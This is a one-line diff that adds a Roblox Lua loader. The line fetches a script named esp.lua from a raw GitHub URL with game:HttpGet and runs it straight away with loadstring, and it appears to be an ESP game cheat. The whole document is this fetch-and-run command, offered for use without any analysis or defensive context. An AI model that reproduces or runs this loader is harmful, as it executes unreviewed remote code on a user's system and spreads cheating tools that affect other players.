@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reighnormanblessfrancist-boop/ESP2/refs/heads/main/esp.lua"))()
